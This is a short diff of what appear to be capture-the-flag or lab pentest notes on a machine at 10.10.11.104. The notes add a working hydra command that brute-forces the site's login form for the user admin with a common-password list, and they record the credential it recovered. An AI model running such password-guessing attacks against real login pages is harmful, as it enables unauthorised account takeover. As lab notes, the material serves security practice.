@@ -15,10 +15,13 @@ There's a login page, you can `POST http://10.10.11.104/login.php username=asdf&
 
 Probably try cred stuffing?
 
-#### Cred stuffing
-
-TODO
-
 #### Subdir scan
 
     bash ../../scripts/discovery/subdirectory-scan.sh $VICTIM
+
+#### Cred stuffing
+
+    hydra -l admin -P ~/Git/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt $VICTIM -V http-form-post '/login.php:username=^USER^&password=^PASS^:S=Location' -t 64
+    
+Apparently it worked. `admin:asdfasdf`. Wow!
+
